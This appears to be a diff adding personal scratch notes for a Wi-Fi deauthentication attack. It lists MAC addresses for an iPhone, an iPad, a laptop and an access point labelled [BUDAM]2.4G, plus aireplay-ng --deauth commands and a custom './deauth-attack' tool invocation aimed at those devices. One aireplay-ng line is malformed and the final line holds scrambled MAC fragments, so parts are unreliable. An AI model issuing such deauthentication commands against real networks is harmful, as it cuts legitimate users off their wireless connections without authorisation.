@@ -1,0 +1,28 @@
+m0nd2y's iphone :
+0A:E0:FB:BF:2F:BF (station)
+46:2C:62:AB:EC:B7 (bssid) 노트북
+1E:73:45:C6:BE:C4 
+
+sudo aireplay-ng wlx588694f4d923 --deauth 20 -a 1E:73:45:C6:BE:C4 -c 0A:E0:FB:BF:2F:BF
+
+
+station's ap :
+58:86:94:f4:d9:23
+
+[BUDAM]2.4G mac
+
+64:E5:99:75:C8:04
+
+ipad mac
+
+E2:42:80:04:FB:E4
+
+sudo aireplay-ng -a wlx588694f4d923 64:E5:99:75:C8:04 E2:42:80:04:FB:E4
+
+E2:42:80:04:FB:E4
+
+
+sudo ./deauth-attack wlx588694f4d923 64:E5:99:75:C8:04 E2:42:80:04:FB:E4
+
+
+99:75:C8:04:64:E5  80:04:FB:E4:64:E5
